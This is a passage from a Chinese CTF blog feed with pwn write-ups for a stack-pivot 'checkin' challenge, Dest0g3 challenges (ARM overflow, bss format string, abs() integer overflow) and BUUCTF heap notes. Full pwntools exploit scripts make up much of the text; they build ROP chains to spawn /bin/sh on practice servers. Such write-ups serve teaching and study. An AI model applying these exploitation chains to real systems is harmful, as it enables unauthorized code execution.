class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">puts_off=libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">setvbuf_off=libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_off))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(setvbuf_off))</span><br><span class="line">pop_rbp_addr=<span class="number">0x40113d</span></span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">setvbuf_got_addr=e.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt_addr=<span class="number">0x401064</span></span><br><span class="line">bss_addr=<span class="number">0x404600</span>+<span class="number">0xa0</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011e2</span></span><br><span class="line">read_addr=<span class="number">0x4011bf</span></span><br><span class="line">magic_gadget=<span class="number">0x40113c</span></span><br><span class="line">csu1=<span class="number">0x40124A</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401253</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">if</span> puts_off&gt;setvbuf_off:</span><br><span class="line">    offset=puts_off-setvbuf_off</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    offset=puts_off-setvbuf_off+<span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(offset))</span><br><span class="line">payload=<span class="number">160</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)+p64(csu1)+p64(offset)<span class="comment">#rbx</span></span><br><span class="line">payload+=p64(setvbuf_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(read_got_addr)</span><br><span class="line">payload+=p64(setvbuf_plt_addr)</span><br><span class="line">payload+=p64(pop_rbp_addr)<span class="comment">#让rbp去指向0x404600（但是rbp本身是0x4046a0)，这样read结束之后触发了第一次leave，就让rsp的值为0x4046a8（这个地址指向的就是leave;ret）（此时rbp由于pop rbp，自身的值变成了0x404600），然后到ret，再次执行了leave;ret</span></span><br><span class="line"><span class="comment">#第二次leave，rsp才算变成了0x404608，然后ret实现了转移至布置到的system处。</span></span><br><span class="line">payload+=p64(<span class="number">0x404600</span>+<span class="number">0xa0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4011BF</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">160</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404600</span>)+p64(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(ret_addr)<span class="comment">#这道题需要栈对齐，具体细节我的另一篇博客上有讲。</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(bin_sh_addr)</span><br><span class="line">payload+=p64(sys_addr)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>如果不太理解exp为什么这样写，就多调试N遍（我光调试这远程一个脚本从写到各种调试再到打通再到彻底理解，调试了73遍…)，总会有所收获的。<br>本人就一菜狗，如果写的有错误的地方，欢迎指正</p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> magic_gadget </tag>
            
            <tag> 栈迁移 </tag>
            
            <tag> 篡改got表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dest0g3 520迎新赛--栈题write_up</title>
      <link href="/posts/4354d4bf.html"/>
      <url>/posts/4354d4bf.html</url>
      
        <content type="html"><![CDATA[<h2 id="ez-aarch">ez_aarch</h2><h3 id="总结：">总结：</h3><p>考察的是最简单的arm架构的栈溢出。</p><h3 id="保护策略">保护策略</h3><img src="https://s2.loli.net/2022/05/27/wCtDTAO95cxIy61.png" alt="image-20220524111202855" style="zoom:33%;" /><p>关于arm架构是怎么启动程序和调试的，可以参考一下我的这篇<a href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">博客</a></p><img src="https://s2.loli.net/2022/05/27/hEBHxi1TcwblWUr.png" alt="image-20220524113235409" style="zoom:50%;" /><p>这里存在溢出，同时题目给了后面，并且很巧合的没开canary，因此这就是最简单的栈溢出题目，不过考虑到这是arm架构的题目跟x86的函数调用还不太一样，没法一眼就看出它的返回地址，需要调试一下。</p><p><img src="https://s2.loli.net/2022/05/27/oMrNmXEPvBVdSeh.png" alt="image-20220524124829771"></p><p>先用cyclic生成48个字符，然后下个断点到0x40000009c8，c过去看一下崩溃的信息。</p><p><img src="https://s2.loli.net/2022/05/27/liJ8YSZTKU7Ep4B.png" alt="image-20220524125046601"></p><p>发现是在kaaalaaa这里崩溃了（因为此时的x30寄存器就是这个值），所以我们只需要把这个地方的内容换成后门函数的地址即可。由于开了PIE，我们无法写入后面函数整个的地址，不过可以只写后门函数的最后一字节，写个0x3c即可。</p><p><img src="https://s2.loli.net/2022/05/27/oUrikO5lxtX34eD.png" alt="image-20220524125339086"></p><h3 id="EXP：">EXP：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./stack&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28710</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">payload=<span class="number">40</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;&lt;&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/05/27/Nd52ZPUytiEfYrb.png" alt="image-20220524125717811" style="zoom:33%;" /><h2 id="dest-love">dest_love</h2><p>总结：</p><p>1、考察的bss段上的格式化字符串漏洞，这道题属于最简单的布置栈链</p><p>2、以后做题之前尽量把libc版本找正确了，这道题的libc试了半天最后试出来了，结果做出来之后发现公告上写了是ubuntu21.04，不然还能做的更快。</p><h3 id="保护策略：">保护策略：</h3><img src="https://s2.loli.net/2022/05/27/VxYJs8WM9wqFRQN.png" alt="image-20220524130642814" style="zoom:33%;" /><h3 id="程序分析：">程序分析：</h3><img src="https://s2.loli.net/2022/05/27/J4TjCPa8QM5fgOS.png" alt="image-20220524130844091" style="zoom: 33%;" /><p>考察的格式化字符串漏洞，同时存在后门函数。</p><p>目前掌握的信息是，格式化字符串漏洞只能用6次，同时format是输入到了bss段，开了PIE。</p><h3 id="大致思路：">大致思路：</h3><p>因为这道题是bss段的格式化字符串，因此需要布置栈链来做，关于栈链的布置可以参考我的这篇<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">博客</a></p><p>不过在这之前这道题有一个很恶心的地方，就是需要猜一下libc（其实也不用猜，公告里给了ubuntu21.04的版本）不过我当时做题的时候没有看公告，然后就一个一个试了一下，试的方法就是nc连接到服务器那边的程序，然后输入很多个%p，看一下泄露数据能否和本地的数据类型对应（比如远程栈顶偏移8的位置是个libc中地址，当本地的栈顶偏移8的位置也是个libc地址就算是对应）</p><p>最后试出来是2.33的libc。在ubuntu21.04的docker里跑一下。（如果初步学习怎么使用docker的可以看这篇<a href="https://www.cnblogs.com/ZIKH26/articles/16278170.html">文章</a>)</p><h3 id="调试过程：">调试过程：</h3><p>在布置栈链之前，先去泄露一下我们需要的地址，<strong>对抗PIE需要用程序基地址，布置栈链需要用栈地址</strong>，调试一下，看看栈里的数据。</p><p>下面是执行printf时的栈中情况。</p><p><img src="https://s2.loli.net/2022/05/27/VUkdBPYgJuftAzZ.png" alt="image-20220524190605046"></p><p>由此可以获取所需地址的偏移，分别是4和8（不过需要加上6个寄存器），泄露出来之后，减去对应的偏移，即可获取程序基地址和所需栈地址。</p><p>接下来就是布置栈链。</p><p>先在栈中找一个栈地址（这个栈地址需要再指向一个栈地址），<strong>很明显符合这个条件的是栈顶偏移4的位置</strong>，由于我们的目的是在这个地方写入这个值（见下图）</p><p><img src="https://s2.loli.net/2022/05/27/zUnZm6B8Q1fDTrp.png" alt="image-20220524191227999"></p><p>所以需要把这个dword_4010写到栈里。考虑到程序基地址和偏移8的栈中内容的前四字节一样，因此利用一下偏移8的数据，先将偏移4的内容指向的值去修改为偏移8的栈地址。</p><img src="https://s2.loli.net/2022/05/27/32oN5BtSmJwz6qD.png" alt="image-20220524194519354" style="zoom:33%;" /><img src="https://s2.loli.net/2022/05/27/gQbT3v5t4nJlsLI.png" alt="image-20220524194437287" style="zoom:33%;" /><p>此时再通过0x7ffcc75c1504这个地址来修改其指向的值，只需要更改低两字节即可。</p><pre><code>此时可以看见，我们已经把我们要修改内容的地址给写到栈里了。</code></pre><p>接下来，在距离栈顶偏移8这个位置直接写入要修改的数据即可。</p><p>这个属于最简单的布置栈链了，如果熟悉整体流程的话，应该做起来还是比较轻松的。</p><h3 id="EXP">EXP:</h3><p>直接复制粘贴这个exp，是打不通的，因为我写了几个函数，放到了tools这个库里面，如果想用下面这个脚本获取shell的话，需要复制粘贴<a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">这里的源码</a>新建一个名为tools的py文件。或者把from tools import *以及debug和log函数这些出现的地方给注释掉也行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1210</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">&#x27;%14$p%10$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1270</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">stack_leak=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">stack_hook=(stack_leak&amp;<span class="number">0xffff</span>)-<span class="number">0xc8</span></span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;base_addr&#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line">log(<span class="string">&#x27;stack_leak&#x27;</span>,<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">dest_addr=base_addr+<span class="number">0x4010</span></span><br><span class="line">log(<span class="string">&#x27;dest_addr&#x27;</span>,<span class="built_in">hex</span>(dest_addr))</span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;stack_hook&#x27;</span>,<span class="built_in">hex</span>(stack_hook))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_hook)+<span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line">back_door=(base_addr+<span class="number">0x4010</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(back_door)+<span class="string">&#x27;c%39$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%1314520c%14$n&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/05/27/2B3Osle1RNzFM5o.png" alt="image-20220524195121599" style="zoom:33%;" /><h2 id="ez-pwn">ez_pwn</h2><h3 id="总结：-v2">总结：</h3><p>1、通过这道题对原码和补码有了更深的认识，负数的值=对应补码-(1&lt;&lt;32) （32位程序）</p><p>2、abs函数是有漏洞的，int类型的范围是-2147483648~ 2147483647 ，这就意味着abs将-2147483648转化为对应的正数是找不到对应的值，就会出现问题。</p><h3 id="保护策略：-v2">保护策略：</h3><img src="https://s2.loli.net/2022/05/27/qUpHdgolmKDJTke.png" alt="image-20220524224426473" style="zoom:50%;" /><h3 id="程序分析：-v2">程序分析：</h3><img src="https://s2.loli.net/2022/05/27/NA3umiPhdfqplJF.png" alt="image-20220524225032285" style="zoom:33%;" /><p>我最开始分析题目的时候，确实没找到漏洞，因为没开canary，我总感觉这道题是能溢出的，然后又一点一点的仔细分析，发现还是没啥毛病，但是根据经验来看，一般感觉没漏洞的时候，漏洞就出现在不太了解的新东西上面。这道题的漏洞点在这个abs函数上，下面来仔细分析一下abs函数漏洞产生的原理。</p><h3 id="abs函数漏洞分析">abs函数漏洞分析</h3><p>abs函数源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>        abs</span></span><br><span class="line"><span class="comment">/* Return the absolute value of I.  */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">abs</span> <span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> i &lt; <span class="number">0</span> ? -i : i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>abs函数的作用就是取绝对值，也就是将负数转换为正数。但是int类型的范围是多少？-2147483648~ 2147483647 这就是int的范围，<strong>可是这个范围不对称，这就意味着使用abs函数，输入-2147483648 它就找不到对应的正值</strong>。当abs函数执行时就会将-2147483648的负号去掉，不过去掉负号之后是2147483648，而int类型的范围里压根就没有这个数字。如果实践一下就会发现-2147483648的绝对值还是-2147483648。</p><h3 id="大致思路：-v2">大致思路：</h3><p>因此思路就出来了，输入-2147483648 ，经过abs()函数后，返回的依旧是-2147483648 ，可以绕过<code>if ( (int)abs32(v2) &gt; 10 )</code>和<code>if ( v4 &gt;= v2 )</code>两个检查（为啥能绕过第二个检查？因为v4和v2都是无符号整数，v2存储的值就是0x80000000，所以v4是肯定比v2小，继而绕过检查），从而可以不断的触发<code>__isoc99_scanf(&quot;%d&quot;, &amp;v1[v4++]);</code>这行代码，v4的索引没有限制因此这里就是溢出点，让v4足够大，正好指向栈里v4的值，然后去修改v4的值，让其指向返回地址。接着就可以篡改返回地址了，剩下的就是ret2libc，劫持程序执行流再来一遍，最终获取shell。</p><p>其实这道题调试一下还是比较简单的，我就放几张图片说明一下过程吧。</p><p>下图是正在溢出<br><img src="https://s2.loli.net/2022/05/27/rbFmHDZNL4It7Q5.png" alt="image-20220525224818058" style="zoom:50%;" /></p><p><img src="https://s2.loli.net/2022/05/27/jPh2AinCrUdqYkH.png" alt="image-20220525224936710"></p><p><img src="https://s2.loli.net/2022/05/27/CR3lwfp8qysodVN.png" alt="image-20220525225022664"></p><p>此时的v4这个偏移就让&amp;v1[v4++]指向了返回地址，然后修改返回地址（如下图）</p><p><img src="https://s2.loli.net/2022/05/27/XzZSq78doOAmspi.png" alt="image-20220525225403369"></p><p>接着把返回地址和参数写入，ret2libc即可。</p><h3 id="libc中地址无法直接写入内存中">libc中地址无法直接写入内存中</h3><p>后面的过程就不再演示了，最后唯一的一个坑就是写入system地址和/bin/sh地址时，由于32位程序libc中的地址是0xf7开头，但是这个数据太大了，不能直接用scanf(%d,&amp;a)写入进去。</p><p>剖析一下原理：</p><blockquote><p>由于scanf会对输入的内容进行过滤，只要是正数，那么存到内存里的最大就是0x7fffffff（因为符号位是不能表示大小的），假如现在想存入0xf7123456，我们来倒推一下（先不管它是咋输入进去的，假设它直接存在于内存中），内存中存放的0xf7123456对应二进制就是1111 0111 0001 0010 0011 0100 0101 0110。</p><p>我们来求一下他真正的值，发现符号位是1，因此判断其为负数，然后要减一，接着对整体取反，最后表示为0000 1000 1110 1101 1100 1011 1010 1010 对应16进制为0x8EDCBAA 因为它当成的补码符号位为1，因此它真正的值是-0x8EDCBAA。</p><p>而最终放到返回地址里的值，我们可不管输入的时候是个什么玩意，反正结果是要让他存储时为0xf7123456，因此我们选择输入-0x8EDCBAA即可</p><p>一句话总结就是：输入的负数存储到内存里时，它的补码是可以超过0x7fffffff的限制，从而可以实现写入0xf7这种更大的值。</p></blockquote><p>观察一下0xf7123456和-0x8EDCBAA之间有什么规律没有，很明显如果用0x100000000减去0xf7123456，得到的就是0x8EDCBAA，换个位置让0xf7123456减去0x100000000，自然得到的就是-0x8EDCBAA。</p><p>负值=对应补码-0x100000000(32位程序) 这个式子在magic gadget中算偏移为负的时候也出现过。</p><h3 id="EXP-v2">EXP:</h3><p>PS:直接复制粘贴我这个脚本是打不通的，因为里面出现了我自己定义的函数，如果想使用下面的脚本，需要复制粘贴<a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">这里的源码</a>新建一个名为tools的py文件。或者把出现的我自定义的函数注释掉，换回正常的代码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./ez_pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27271</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,0x0804930D)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;-2147483800&#x27;</span>)</span><br><span class="line">a=<span class="number">4369</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a+i))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">17</span>))</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x08049408</span></span><br><span class="line">log(<span class="string">&#x27;puts_plt_addr&#x27;</span>,(puts_plt_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(puts_plt_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(puts_got_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment">#result=local_search(&#x27;puts&#x27;,puts_addr,libc)</span></span><br><span class="line">result =long_search(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">sys_addr=result[<span class="number">0</span>]</span><br><span class="line">bin_sh_addr=result[<span class="number">1</span>]</span><br><span class="line">p.sendline(<span class="string">&#x27;-2147483800&#x27;</span>)</span><br><span class="line">a=<span class="number">4369</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a+i))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">17</span>))</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x08049408</span></span><br><span class="line">log(<span class="string">&#x27;puts_plt_addr&#x27;</span>,(puts_plt_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sys_addr-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(bin_sh_addr-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/05/27/91AutEp7wzOoacL.png" alt="image-20220526001630304" style="zoom:33%;" />]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串漏洞 </tag>
            
            <tag> 整数溢出 </tag>
            
            <tag> ARM架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF刷题记录</title>
      <link href="/posts/a90346a2.html"/>
      <url>/posts/a90346a2.html</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面">写在前面</h2><p>现在BUU第六页快做完了，发现现在有的题目在做的时候确实没想出来，不过看了一眼其他师傅的wp就很快写出来了,如果针对这类题目再去单独写一份wp又没太多必要。所以在之后的做完的题目里，没有必要单独写一篇wp的题目以及直接做出来的题目就都放到这篇文章来简单记录一下了。</p><h2 id="hwb-2019-mergeheap">hwb_2019_mergeheap</h2><p>merge函数可以让两个堆块的内容合并一起，并且新申请出来一个大堆块。让内容合并在一起的思路是先复制第一个堆块的数据，然后再把第二个堆块的数据追加到第一个堆块的后面。<strong>漏洞是追加的时候如果我们申请了例如0x88 0x98 0xa8这样的堆块并且写满了数据，那么还会把第二个堆块的size位给追加上去，从而溢出覆盖了下一个堆块size位</strong></p><p>做一个堆块重叠打tcache poisoning即可。泄露libc地址的话，先申请两个堆块(保证加起来的size大于0x410)，然后合并后将大堆块释放掉，再申请0x8的堆块出来，写入0x8个字符a，对其执行show函数，即可泄露unsorted bin的bk指针</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28548&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&quot;/bin/sh\x00&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">idx1,idx2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx1:&quot;</span>,<span class="built_in">str</span>(idx1))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx2:&quot;</span>,<span class="built_in">str</span>(idx2))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">merge(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x300</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3ec110</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x2c0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x3d0</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="string">&quot;b&quot;</span>*<span 